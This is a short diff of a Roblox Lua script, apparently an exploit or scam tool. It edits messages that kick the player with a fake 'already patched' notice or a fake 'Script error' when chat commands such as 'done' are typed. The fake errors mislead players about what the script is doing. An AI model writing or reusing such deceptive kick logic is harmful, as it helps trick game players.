@@ -80,11 +80,11 @@ if total <= 3 then
   wait(13)
 
   game:GetService("Players").LocalPlayer:Kick(
-      "This script has already been patched!\nJoin my Discord to get the latest script!"
+      "This script has already been patched."
   )
   return
 else
-  print("2-5 minutes\nLoading...")
+  print("wait 2-5 minutes\nLoading...")
 end
   
   local exploit
@@ -184,7 +184,7 @@ end
             end
             if lowerMsg == "/kick" or lowerMsg == "kick" or lowerMsg == "done" then
               game:GetService("Players").LocalPlayer:Kick(
-                "Script error while running!\nTry Again!"
+                "Error while running.\nTry Again!"
             )
             end
         end)
